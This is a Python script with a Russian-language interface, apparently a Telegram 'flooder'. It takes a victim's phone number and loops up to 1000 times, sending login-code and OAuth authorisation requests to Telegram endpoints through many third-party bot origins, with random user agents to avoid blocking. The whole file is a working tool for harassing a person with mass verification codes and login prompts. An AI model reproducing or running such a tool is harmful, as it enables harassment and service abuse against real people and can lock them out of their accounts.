import os

import fake_useragent
import requests
from pystyle import Center, Colorate, Colors

os.system("cls" if os.name == "nt" else "clear")


banner = """
╭───────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                           │
│     ███        ▄██████▄          ▄████████  ▄█       ███    █▄  ████████▄     ▄████████   │
│ ▀█████████▄   ███    ███        ███    ███ ███       ███    ███ ███   ▀███   ███    ███   │
│    ▀███▀▀██   ███    █▀         ███    █▀  ███       ███    ███ ███    ███   ███    █▀    │
│     ███   ▀  ▄███              ▄███▄▄▄     ███       ███    ███ ███    ███  ▄███▄▄▄       │
│     ███     ▀▀███ ████▄       ▀▀███▀▀▀     ███       ███    ███ ███    ███ ▀▀███▀▀▀       │
│     ███       ███    ███        ███        ███       ███    ███ ███    ███   ███    █▄    │
│     ███       ███    ███        ███        ███▌    ▄ ███    ███ ███   ▄███   ███    ███   │
│    ▄████▀     ████████▀         ███        █████▄▄██ ████████▀  ████████▀    ██████████   │
│                                           ▀                                               │
│                                                                                           │
│                            [●] Coder: @vedmoor                                            │
│                            [●] Для возврата напишите 99                                   │
│                                                                                           │
╰───────────────────────────────────────────────────────────────────────────────────────────╯
                                                                                                                                                                     ░               
"""


print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
number = int(input("Введите номер в формате +7999999999: "))
if number == 99:
    os.system("python main.py")

count = 0

try:
    for _ in range(1000):
        user = fake_useragent.UserAgent().random
        headers = {"user-agent": user}
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://translations.telegram.org/auth/request",
            headers=headers,
            data={"phone": number},
        )

        requests.post(
            "https://translations.telegram.org/auth/request",
            headers=headers,
            data={"phone": number},
        )

        requests.post(
            "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://oauth.telegram.org/auth?bot_id=547043436&origin=https%3A%2F%2startpack.ru&embed=1&request_access=write&return_to=https%3A%2F%2startpack.ru%2Fwidgets%2Flogin",
            headers=headers,
            data={"phone": number},
        )
        requests.post(
            "https://my.telegram.org/auth/send_password",
            headers=headers,
            data={"phone": number},
        )

        count += 1
        print("Коды успешно отправлены")
        print(f"Всего циклов: {count} ")
except Exception:
    print("Ошибка, проверьте вводимые данные:")
